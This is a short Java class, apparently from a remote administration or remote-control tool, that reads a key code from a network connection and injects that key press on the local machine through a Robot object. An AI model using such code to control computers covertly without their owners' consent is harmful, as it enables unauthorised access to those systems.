package com.redpois0n.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class PacketKP extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int btn = Connection.readInt();
		Main.robot.keyPress(btn);
	}

}
